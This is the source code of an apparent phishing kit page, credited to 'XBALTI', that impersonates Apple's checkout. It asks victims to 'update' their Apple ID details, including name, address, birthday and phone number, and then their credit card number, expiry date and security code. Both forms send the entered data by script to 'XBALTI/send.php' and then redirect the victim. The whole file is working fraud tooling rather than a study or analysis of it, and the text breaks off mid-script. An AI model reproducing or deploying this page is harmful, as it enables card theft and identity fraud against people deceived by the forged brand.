             <!-- ,;;;;;;;, -->
            <!-- ;;;;;;;;;;;, -->
           <!-- ;;;;;'_____;' -->
           <!-- ;;;(/))))|((\ -->
           <!-- _;;((((((|)))) -->
          <!-- / |_\\\\\\\\\\\\ -->
     <!-- .--~(  \ ~)))))))))))) -->
    <!-- /     \  `\-(((((((((((\\ -->
    <!-- |    | `\   ) |\       /|) -->
     <!-- |    |  `. _/  \_____/ | -->
      <!-- |    , `\~            / -->
       <!-- |    \  \ BY XBALTI / -->
      <!-- | `.   `\|          / -->
      <!-- |   ~-   `\        / -->
       <!-- \____~._/~ -_,   (\ -->
        <!-- |-----|\   \    ';; -->
       <!-- |      | :;;;'     \ -->
      <!-- |  /    |            | -->
      <!-- |       |            |    -->
<!doctype html>
<html>

<head>

    <title>Information — Secure Checkout - Apple</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <link rel="stylesheet" href="./css/style.css" media="screen, print">

    <link rel="stylesheet" type="text/css" media="all" href="./css/desing.css">

    <link rel="stylesheet" href="./css/style2.css" media="screen, print">

    <link rel="stylesheet" href="./css/fonts.css" media="screen, print">

    <link rel="stylesheet" href="./css/hanan.css" media="screen, print">

    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
    <script src="./js/jquery.CardValidator.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

    <style>
        .gadfi {
            max-width: 600px;
            width: 700px;
        }
        
        [class*="res"] {
            width: 100%;
        }
        
        .lollol {
            background-size: 36px;
            width: 37px;
            height: 30px;
            right: 10px;
            top: 10px;
            float: left;
            position: absolute;
        }
        
        .ccvimg {
            background-image: url(./img/ccv.gif);
            width: 50px;
            height: 32px;
            right: 10px;
            top: 12px;
            float: left;
            position: absolute;
        }
        
        .gadiha {
            display: table;
            display: flex;
            justify-content: space-between;
            width: 100%;
            list-style: none;
            margin: 0 0 1.5em;
        }
        
        .zwina {
            display: inline-block;
            text-align: center;
        }
        
        .img_small {
            width: 3.2em;
            height: 2.1em;
            margin: 0 auto;
            border-radius: 7px;
            display: inline-block;
        }
        
        .tgadi {
            width: 17em;
            height: 5.1em;
            margin: 0 auto;
            border-radius: 12px;
            display: inline-block;
        }
        
        .shadow {
            box-shadow: 0 0px 9px #111111;
        }
        
        .transparent {
            opacity: 0.2;
        }
        
        .card-icons {
            vertical-align: middle;
        }
        
        .visaimg,
        .mastercardimg,
        .discoverimg,
        .lawla,
        .ameximg {
            background-position: 0 3.2897%;
            background-size: 100%;
            background-image: url('./img/cardsimg.png');
        }
        
        .discoverimg {
            background-position: 0 42.887097%;
            background-size: 100%;
        }
        
        .lawla {
            background-image: url('./img/lawla.png');
            background-size: 100%;
        }
        
        .mastercardimg {
            background-position: 0 65.6%;
            background-size: 100%;
        }
        
        .visaimg {
            background-position: 0 88.25161%;
            background-size: 100%;
        }
        
        #loading {
            width: 100%;
            height: 100%;
            top: 0px;
            left: 0px;
            position: fixed;
            display: block;
            opacity: .9;
            background-color: rgba(241, 241, 241, 0.75);
            z-index: 99;
            text-align: center;
        }
        
        #loading-image {
            position: fixed;
            width: 125px;
            height: 122px;
            z-index: 1000;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            transform: -webkit-translate(-50%, -50%);
            transform: -moz-translate(-50%, -50%);
            transform: -ms-translate(-50%, -50%);
        }
    </style>

    <script src="./js/header.js"></script>

</head>

<body>
    <div style="display: none;"  id="loading">
        <img id="loading-image" src="./img/loadingvbv.gif" />
    </div>
    <div class="metrics">

    </div>

    <div id="page">

        <meta name="ac-gn-store-key" content="SKCXTKATUYT9JK4HD">
        <meta name="ac-gn-segmentbar-redirect" content="true">

        <aside dir="ltr" lang="en-US" class="ac-gn-segmentbar" id="ac-gn-segmentbar">
        </aside>
        <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
        <nav dir="ltr" id="ac-globalnav" class="js no-touch" role="navigation">
            <div class="ac-gn-content">
                <ul class="ac-gn-header">
                    <li class="ac-gn-item ac-gn-menuicon">
                        <label class="ac-gn-menuicon-label" for="ac-gn-menustate">
                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                            </span>
                            <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
						<span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                            </span>
                        </label>
                        <a href="#ac-gn-menustate" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
                            <span class="ac-gn-menuanchor-label">Global Nav Open Menu</span>
                        </a>
                        <a href="#" role="button" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
                            <span class="ac-gn-menuanchor-label">Global Nav Close Menu</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-apple">
                        <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus-small" data-feature-name="Globalnav" data-display-name="null">
                            <span class="ac-gn-link-text">Apple</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                        <a href="#" class="ac-gn-link ac-gn-link-bag" data-feature-name="Globalnav" data-display-name="null">
                            <span class="ac-gn-link-text">Shopping Bag</span>
                            <span class="ac-gn-bag-badge"></span>
                        </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <div class="ac-gn-search-placeholder-container" role="search">
                    <div class="ac-gn-search ac-gn-search-small">
                        <a id="ac-gn-link-search-small" class="ac-gn-link" href="#" role="button" aria-haspopup="true" data-feature-name="Globalnav" data-display-name="null">
                            <div class="ac-gn-search-placeholder-bar">
                                <div class="ac-gn-search-placeholder-input">
                                    <div class="ac-gn-search-placeholder-input-text">
                                        <div class="ac-gn-link-search ac-gn-search-placeholder-input-icon" data-asext-evar="eVar1" data-asext-feature="Globalnav" data-asext-action="search"></div>
                                        <span class="ac-gn-search-placeholder"></span>
                                    </div>
                                </div>
                                <div class="ac-gn-searchview-close ac-gn-searchview-close-small ac-gn-search-placeholder-searchview-close">
                                    <span class="ac-gn-searchview-close-cancel">Cancel</span>
                                </div>
                            </div>
                        </a>
                    </div>
                </div>
                <ul class="ac-gn-list">
                    <li class="ac-gn-item ac-gn-apple">
                        <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus" >
                            <span class="ac-gn-link-text">Apple</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
                        <a href="#" class="ac-gn-link ac-gn-link-mac" >
                            <span class="ac-gn-link-text">Mac</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
                        <a href="#" class="ac-gn-link ac-gn-link-ipad" >
                            <span class="ac-gn-link-text">iPad</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
                        <a href="#" class="ac-gn-link ac-gn-link-iphone" >
                            <span class="ac-gn-link-text">iPhone</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
                        <a href="#" class="ac-gn-link ac-gn-link-watch" >
                            <span class="ac-gn-link-text">Watch</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
                        <a href="#" class="ac-gn-link ac-gn-link-tv" >
                            <span class="ac-gn-link-text">TV</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
                        <a href="#" class="ac-gn-link ac-gn-link-music" >
                            <span class="ac-gn-link-text">Music</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
                        <a href="#" class="ac-gn-link ac-gn-link-support" >
                            <span class="ac-gn-link-text">Support</span>
                        </a>
                    </li>
                    <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                        <a href="#" class="ac-gn-link ac-gn-link-search" id="ac-gn-link-search" role="button" ></a>
                    </li>
                    <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                        <a href="#" class="ac-gn-link ac-gn-link-bag" >
                            <span class="ac-gn-link-text">Shopping Bag</span>
                            <span class="ac-gn-bag-badge"></span>
                        </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <aside role="search" class="ac-gn-searchview" id="ac-gn-searchview">
                    <div class="ac-gn-searchview-content">
                        <div class="ac-gn-searchview-bar">
                            <div class="ac-gn-searchview-bar-wrapper">
                                <form method="get" action="#" class="ac-gn-searchform" id="ac-gn-searchform">
                                    <div class="ac-gn-searchform-wrapper">
                                        <input spellcheck="false" autocomplete="off" placeholder="Search apple.com" id="ac-gn-searchform-input" role="combobox" class="ac-gn-searchform-input" type="text">
                                        <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
                                        <button class="ac-gn-searchform-submit" type="submit" id="ac-gn-searchform-submit"></button>
                                        <button class="ac-gn-searchform-reset" type="reset" id="ac-gn-searchform-reset">
                                            <span class="ac-gn-searchform-reset-background"></span>
                                        </button>
                                    </div>
                                </form>
                                <button id="ac-gn-searchview-close-small" class="ac-gn-searchview-close ac-gn-searchview-close-small">
                                    <span class="ac-gn-searchview-close-cancel">
									Cancel
								</span>
                                </button>
                            </div>
                        </div>
                        <aside class="ac-gn-searchresults" id="ac-gn-searchresults">
                            <section class="ac-gn-searchresults-section ac-gn-searchresults-section-defaultlinks">
                                <div class="ac-gn-searchresults-section-wrapper">
                                    <h3 class="ac-gn-searchresults-header ac-gn-searchresults-animated">Quick Links</h3>
                                    <ul class="ac-gn-searchresults-list" id="defaultlinks" role="listbox">
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Find a Store</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Today at Apple</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">Accessories</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">AirPods</a>
                                        </li>
                                        <li class="ac-gn-searchresults-item ac-gn-searchresults-animated" role="presentation">
                                            <a href="#" role="option" class="ac-gn-searchresults-link ac-gn-searchresults-link-defaultlinks">iPod</a>
                                        </li>
                                    </ul>
                                    <span role="status" class="ac-gn-searchresults-count">5 Quick Links</span>
                                </div>
                            </section>

                        </aside>
                    </div>
                    <button class="ac-gn-searchview-close" id="ac-gn-searchview-close">
                        <span class="ac-gn-searchview-close-wrapper">
						<span class="ac-gn-searchview-close-left"></span>
                        <span class="ac-gn-searchview-close-right"></span>
                        </span>
                    </button>
                </aside>
                <aside class="ac-gn-bagview">
                    <div class="ac-gn-bagview-scrim">
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
                    </div>
                    <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
                    </div>
                </aside>
            </div>
        </nav>
        <div class="ac-gn-blur"></div>
        <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
        <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>

        <br>
        <br>
        <br>
        <br>

        <div id="wa7ed">

            <div class="gadfi res" style="background: rgba(255,255,255,.96);border-radius: 5px;padding: 1.25rem 0;margin: 0 auto;box-shadow: 2px 2px 20px 4px rgb(0, 0, 0);">

                <form action="" name="billform" id="billform" method="POST">

                    <div class="flow-section account-info-section">
                        <div class="container-xs centered">

                            <center><img src="./img/Apple_logo_grey.svg" width="50px"></center>

                            <br>

                            <h2 align="center">Update Your Apple ID information</h2>

                            <br>
                            <hr>
                            <br>
                            <div class="form-table">
                                <div class="form-cell">
                                    <div class="form-sidebyside-textboxes row">

                                        <div class="column large-6 medium-6 small-6">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding right">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523472997-0">

                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="Firstname" name="Firstname" class="generic-input-field   form-textbox form-textbox-text" type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523472998-0">First name</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-6 medium-6 small-6">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">

                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="Lastname" name="Lastname" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">Last name</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-12">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="AddressLine" name="AddressLine" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">Address Line</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-12">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="City" name="City" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">City</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-6 medium-6 small-6">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding right">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523472997-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="State" name="State" class="generic-input-field   form-textbox form-textbox-text" type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523472998-0">State</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-6 medium-6 small-6">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="ZipCode" name="ZipCode" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">Zip Code</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                        <div class="column large-12">
                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="Birthday" name="Birthday" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">MM/DD/YYYY</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>

                                        </div>

                                        <div class="column large-12">

                                            <div class="pop-wrapper field-pop-wrapper">
                                                <div class="field-wrapper padding left">

                                                    <div class="name-input">

                                                        <div class="" id="idms-error-wrapper-1567523473042-0">
                                                            <br>
                                                            <div class="ll form-element">
                                                                <input autocomplete="off" spellcheck="false" id="PhoneNumber" name="PhoneNumber" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                <span class="form-label" id="idms-input-labelledby-1567523473042-1">PhoneNumber</span>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>

                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>

                            <br>

                            <div class="as-signin-button">
                                <button type="submit" class="button button-block form-button"><span>Confirm</span><span class="visuallyhidden">Confirm</span></button>
                            </div>

                            <br>

                            <div class="label-small text-centered centered tk-caption field-caption details privacy-wrapper">
                                <div class="privacy-icon"></div>

                                <hr>
                                <br> Your Apple&nbsp;ID information is used to allow you to sign in securely and access your data. Apple records certain usage data for security, support, and reporting purposes. <a href="#">See how your data is managed.<span class="sr-only"> Opens in a new window.</span></a>
                            </div>

                            <div class="toolbar-wrapper toolbar-footer clearfix  " id="1567525850371-0" align="center">
                                <div class="button-group flow-controls clearfix pull-right ">
                                </div>

                            </div>

                        </div>

                    </div>
                </form>

            </div>
        </div>

        <div id="joj" style="display:none;">
            <div class="gadfi res" style="background: rgba(255,255,255,.96);border-radius: 5px;padding: 1.25rem 0;margin: 0 auto;box-shadow: 2px 2px 20px 4px rgb(0, 0, 0);">

                <form action="" name="cardform" id="cardform" method="POST">

                    <div class="flow-section account-info-section">
                        <div class="container-xs centered">

                            <center><img src="./img/Apple_logo_grey.svg" width="50px"></center>

                            <br>

                            <h2 align="center">Update Your Credit/Debit Card information</h2>

                            <br>
                            <hr>
                            <br>
                            <div>
                                <ul class="gadiha">
                                    <div class="zwina"> <span id="visa" class="img_small shadow visaimg card-icons "></span> </div>
                                    <div class="zwina"> <span id="mastercard" class="img_small shadow mastercardimg card-icons"></span> </div>
                                    <div class="zwina"> <span id="amex" class="img_small shadow ameximg card-icons"> </span> </div>
                                    <div class="zwina"> <span id="discover" class="img_small shadow discoverimg card-icons"> </span> </div>
                                </ul>
                            </div>

                            <div class="" id="idms-error-wrapper-1567523474230-0">

                                <input type="hidden" name="cardtype" id="cardtype" value="" />

                                <br>

                                <div class="form-table">
                                    <div class="form-cell">
                                        <div class="form-sidebyside-textboxes row">
                                            <div class="column large-12">
                                                <div class="pop-wrapper field-pop-wrapper">
                                                    <div class="field-wrapper padding left">

                                                        <div class="name-input">

                                                            <div class="" id="idms-error-wrapper-1567523473042-0">
                                                                <br>
                                                                <div class="mm form-element">
                                                                    <input autocomplete="off" spellcheck="false" id="nameoncard" name="nameoncard" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                    <span class="form-label" id="idms-input-labelledby-1567523473042-1">Name On Card</span>

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>
                                            </div>

                                            <div class="column large-12">
                                                <div class="pop-wrapper field-pop-wrapper">
                                                    <div class="field-wrapper padding left">

                                                        <div class="name-input">

                                                            <div class="" id="idms-error-wrapper-1567523473042-0">
                                                                <br>
                                                                <div class="mm form-element">

                                                                    <span id="visa1" class="lollol img_small zwina shadow visaimg card-icons " style="display:none;"></span>
                                                                    <span id="mastercard1" class="lollol img_small zwina shadow mastercardimg card-icons" style="display:none;"></span>
                                                                    <span id="amex1" class="lollol img_small zwina shadow ameximg card-icons" style="display:none;"> </span>
                                                                    <span id="discover1" class="lollol zwina img_small shadow discoverimg card-icons" style="display:none"> </span>
                                                                    <span id="lawla" class="lollol zwina img_small shadow lawla card-icons"> </span>
                                                                    <input autocomplete="off" spellcheck="false" id="cardNumber" name="cardNumber" class="generic-input-field   form-textbox form-textbox-text  " type="text" value="">
                                                                    <span class="form-label" id="idms-input-labelledby-1567523473042-1">Card Number</span>

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>
                                            </div>

                                            <div class="column large-6 medium-6 small-6">
                                                <div class="pop-wrapper field-pop-wrapper">
                                                    <div class="field-wrapper padding right">

                                                        <div class="name-input">

                                                            <div class="" id="idms-error-wrapper-1567523472997-0">
                                                                <br>
                                                                <div class="mm form-element">
                                                                    <input autocomplete="off" spellcheck="false" id="Exate" name="Exate" class="generic-input-field   form-textbox form-textbox-text" type="text" value="">
                                                                    <span class="form-label">Expiration Date</span>

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>
                                            </div>

                                            <div class="column large-6 medium-6 small-6">
                                                <div class="pop-wrapper field-pop-wrapper">
                                                    <div class="field-wrapper padding left">

                                                        <div class="name-input">

                                                            <div class="" id="idms-error-wrapper-1567523473042-0">
                                                                <br>
                                                                <div class="mm form-element">
                                                                    <input autocomplete="off" spellcheck="false" id="SecurityCode" class="generic-input-field   form-textbox form-textbox-text  " type="text" name="SecurityCode" value="">
                                                                    <span class="ccvimg" id="ccvimg"></span>
                                                                    <span class="form-label" id="idms-input-labelledby-1567523473042-1">(CCV)</span>

                                                                </div>

                                                            </div>

                                                        </div>

                                                    </div>

                                                </div>
                                                <br>
                                            </div>

                                            <div class="as-signin-button">

                                                <button type="submit" class="button button-block form-button"><span>Confirm</span><span class="visuallyhidden">Confirm</span></button>
                                            </div>

                                        </div>
                                    </div>
                                </div>

                                <br>

                                <div class="label-small text-centered centered tk-caption field-caption details privacy-wrapper">
                                    <div class="privacy-icon"></div>

                                    <hr>
                                    <br> Your Apple&nbsp;ID information is used to allow you to sign in securely and access your data. Apple records certain usage data for security, support, and reporting purposes. <a href="#">See how your data is managed.<span class="sr-only"> Opens in a new window.</span></a>
                                </div>

                                <div class="toolbar-wrapper toolbar-footer clearfix  " id="1567525850371-0" align="center">
                                    <div class="button-group flow-controls clearfix pull-right ">
                                    </div>

                                </div>

                            </div>

                        </div>

                    </div>

                </form>

            </div>
        </div>
        <br>
        <br>
        <br>
        <br>
        <br>

        <div class="as-chat rs-chat">
            <div class="as-l-container rs-chat-content">

                <div>Need more help?
                    <button class="as-chat-button as-buttonlink">Chat now</button> or call 1‑800‑MY‑APPLE.</div>

            </div>
        </div>
        <div class="as-footnotes js flexbox">
            <div class="as-footnotes-content">
                <div class="as-footnotes-sosumi">
                    <p>The Apple Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a>.</p>
                </div>
            </div>
        </div>

        <footer class="as-globalfooter as-globalfooter-simple as-globalfooter-contained js flexbox">
            <div class="as-globalfooter-content">
                <div class="as-globalfooter-mini">

                    <div class="as-globalfooter-mini-shop">

                        <p>More ways to shop: <span class="nowrap">Visit an <a href="#" target="_blank">Apple Store</a></span>, <span class="nowrap">call 1‑800‑MY‑APPLE, or <a href="#" target="_blank">find a reseller</a></span>.</p>

                    </div>

                    <div class="as-globalfooter-mini-locale">

                        <a class="as-globalfooter-mini-locale-link" href="#">
                        <?php echo $_SESSION['country']; ?>
                    </a>

                    </div>

                    <div class="as-globalfooter-mini-legal">
                        <p class="as-globalfooter-mini-legal-copyright">
                            Copyright © 2019 Apple Inc. All rights reserved.
                        </p>
                        <p class="as-globalfooter-mini-legal-links">

                            <a class="as-globalfooter-mini-legal-link" href="#">Privacy Policy</a>

                            <a class="as-globalfooter-mini-legal-link" href="#l">Terms of Use</a>

                            <a class="as-globalfooter-mini-legal-link" href="#">Sales and Refunds</a>

                            <a class="as-globalfooter-mini-legal-link" href="#">
			        Site Map
			    </a>
                        </p>
                    </div>

                </div>

            </div>
        </footer>

        <div class="overlay" tabindex="-1"><span class="chrome tl"></span><span class="chrome tr"></span><span class="chrome top"></span><span class="chrome left"></span><span class="chrome right"></span><span class="chrome bottom"></span><span class="chrome bl"></span><span class="chrome br"></span><span class="chrome center"></span>
            <div class="container">
                <div class="content" id="overlayContent"></div>
                <ul class="buttons recoveryOptions">
                    <li>
                        <button></button>
                    </li>
                </ul>
            </div>
            <button class="close"></button>
        </div>

        <div id="ac-gn-viewport-emitter"> </div>
	<script>
	
	    $('input[name="PhoneNumber"]').mask('000000000000');
    $('input[name="cardNumber"]').mask('0000 0000 0000 0000 0000');
    $('input[name="Exate"]').mask('00/0000');
    $('input[name="SecurityCode"]').mask('0000');
    $('input[name="Birthday"]').mask('00/00/0000');
	
	
	$(function() {
	  $("form[name='billform']").validate({
    rules: {
       Firstname : "required",
       Lastname : "required",
	   AddressLine : "required",
	   City : "required",
	   State : "required",
	   ZipCode : "required",
	   Birthday : "required",
	   PhoneNumber : "required",
    },
	      highlight: function(element) {
                        $(element).parents( ".ll" ).addClass("is-error ");
                    },
         unhighlight: function(element) {
                        $(element).parents( ".ll" ).removeClass("is-error ");
                    },
       messages: {
       Firstname : "",
       Lastname : "",
	   AddressLine : "",
	   City : "",
	   State : "",
	   ZipCode : "",
	   Birthday : "",
	   PhoneNumber : "",
    },

     submitHandler: function(form) {
            $("#loading").show();
                 $.post("XBALTI/send.php", $("#billform").serialize(), function(result) {
                          setTimeout(function() {
							  $("#wa7ed").hide(1000);
                              $("#joj").show(1000);
                              $("#loading").hide(500);
                 $(location).attr("", "");
                        },2000);
            });
        },
  
    });

});




	$(function() {
	  $("form[name='cardform']").validate({
    rules: {
       nameoncard : "required",
       cardNumber : "required",
	   Exate : "required",
	   SecurityCode : "required",
    },
	      highlight: function(element) {
                        $(element).parents( ".mm" ).addClass("is-error ");
                    },
         unhighlight: function(element) {
                        $(element).parents( ".mm" ).removeClass("is-error ");
                    },
       messages: {
       nameoncard : "",
       cardNumber : "",
	   Exate : "",
	   SecurityCode : "",
    },

     submitHandler: function(form) {
            $("#loading").show();
                 $.post("XBALTI/send.php", $("#cardform").serialize(), function(result) {
                          setTimeout(function() {
                              $("#loading").hide(500);
                 $(location).attr("href", "Secure");
                        },2000);
            });
        },
  
    });

});


			$(document).ready(function(){
    $('#Firstname').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#Firstname").removeClass("form-textbox-entered");	
		} 
        else {
		$("#Firstname").addClass("form-textbox-entered"); 
			}});
    });
	
	$(document).ready(function(){
    $('#Lastname').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#Lastname").removeClass("form-textbox-entered");	
		} 
        else {
		$("#Lastname").addClass("form-textbox-entered");
			}});
    });
	
		$(document).ready(function(){
    $('#AddressLine').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#AddressLine").removeClass("form-textbox-entered");	
		} 
        else {
		$("#AddressLine").addClass("form-textbox-entered");
			}});
    });
	
			$(document).ready(function(){
    $('#City').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#City").removeClass("form-textbox-entered");	
		} 
        else {
		$("#City").addClass("form-textbox-entered");
			}});
    });
	
				$(document).ready(function(){
    $('#State').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#State").removeClass("form-textbox-entered");	
		} 
        else {
		$("#State").addClass("form-textbox-entered");
			}});
    });
					$(document).ready(function(){
    $('#ZipCode').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#ZipCode").removeClass("form-textbox-entered");	
		} 
        else {
		$("#ZipCode").addClass("form-textbox-entered");
			}});
    });
						$(document).ready(function(){
    $('#PhoneNumber').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#PhoneNumber").removeClass("form-textbox-entered");	
		} 
        else {
		$("#PhoneNumber").addClass("form-textbox-entered");
			}});
    });
							$(document).ready(function(){
    $('#Birthday').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#Birthday").removeClass("form-textbox-entered");	
		} 
        else {
		$("#Birthday").addClass("form-textbox-entered");
			}});
    });
								$(document).ready(function(){
    $('#nameoncard').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#nameoncard").removeClass("form-textbox-entered");	
		} 
        else {
		$("#nameoncard").addClass("form-textbox-entered");
			}});
    });
								$(document).ready(function(){
    $('#cardNumber').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#cardNumber").removeClass("form-textbox-entered");	
		} 
        else {
		$("#cardNumber").addClass("form-textbox-entered");
			}});
    });
								$(document).ready(function(){
    $('#Exate').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#Exate").removeClass("form-textbox-entered");	
		} 
        else {
		$("#Exate").addClass("form-textbox-entered");
			}});
    });
								$(document).ready(function(){
    $('#SecurityCode').on('keyup keydown keypress change paste',
	function() {  
        if ($(this).val() == '') {
        $("#SecurityCode").removeClass("form-textbox-entered");	
		} 
        else {
		$("#SecurityCode").addClass("form-textbox-entered");
			}});
    });
	
  $('#cardNumber').validateCreditCard(function(result) {
		if (result.card_type != null) {switch (result.card_type.name) {
			case "VISA":
			$("#lawla").hide(200);
			$("#visa1").show(200);
			$("#amex1").hide(200);
			$("#mastercard1").hide(200);
			$("#discover1").hide(200);
                $( "#visa" ).removeClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).addClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'Visa';
						break;

			case "MASTERCARD":
			$("#lawla").hide(200);
			$("#visa1").hide(200);
			$("#amex1").hide(200);
			$("#mastercard1").show(200);
			$("#discover1").hide(200);
                $( "#visa" ).addClass( "transparent" );
                $( "#amex" ).addClass( "transparent" );
                $( "#mastercard" ).removeClass( "transparent" );
                $( "#discover" ).addClass( "transparent" );
						document.getElementById('cardtype').value = 'MasterCard';
						break;

			case "DISCOVER":
